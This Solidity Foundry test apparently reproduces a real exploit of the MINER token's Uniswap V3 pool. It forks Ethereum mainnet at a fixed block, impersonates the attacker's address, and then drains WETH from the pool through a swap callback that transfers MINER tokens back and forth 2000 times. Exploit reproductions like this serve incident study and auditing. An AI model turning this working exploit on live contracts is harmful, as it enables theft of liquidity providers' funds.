// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";

interface IMainerUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}

interface IMiner {
    function transferFrom(address from, address to, uint256 value) external;

    function transfer(address to, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function uri(uint256 id) external view returns (string memory);
}

contract ContractTest is Test {
    address attacker = 0xea75AeC151f968b8De3789CA201a2a3a7FaeEFbA;
    IMainerUNIV3POOL pool =
        IMainerUNIV3POOL(0x732276168b421D4792E743711E1A48172EA574a2);
    IMiner MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 19226507);
        cheats.label(address(MINER), "MINER");
        cheats.label(address(pool), "MINER_Pool");
        cheats.label(address(WETH), "WETH");
    }

    function testExpolit() public {
        emit log_named_uint(
            "Attacker ETH balance before exploit",
            WETH.balanceOf(address(this))
        );
        cheats.startPrank(attacker);
        emit log_named_address("Address", address(MINER));
        emit log_named_address("Address", address(this));
        emit log_named_address("Address", address(WETH));
        emit log_named_address("Address", address(attacker));
        emit log_named_uint("ll ", MINER.balanceOf(attacker));
        MINER.transfer(address(this), MINER.balanceOf(attacker));
        MINER.balanceOf(address(this));
        emit log_named_uint("Weth", WETH.balanceOf(address(this)));
        emit log_named_uint("Miner", MINER.balanceOf(address(this)));
        cheats.stopPrank();
        bool zeroForOne = false;
        int256 amountSpecified = 999_999_999_999_999_998_000;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
        bytes memory data = abi.encodePacked(uint8(0x61));
        pool.swap(
            address(this),
            zeroForOne,
            amountSpecified,
            sqrtPriceLimitX96,
            data
        );
        emit log_named_uint("Attacker", WETH.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        MINER.balanceOf(address(this));
        for (uint256 i = 0; i < 2000; i++) {
            MINER.transfer(address(pool), 499_999_999_999_999_999);
            MINER.transfer(address(this), 499_999_999_999_999_999);
        }
    }
}
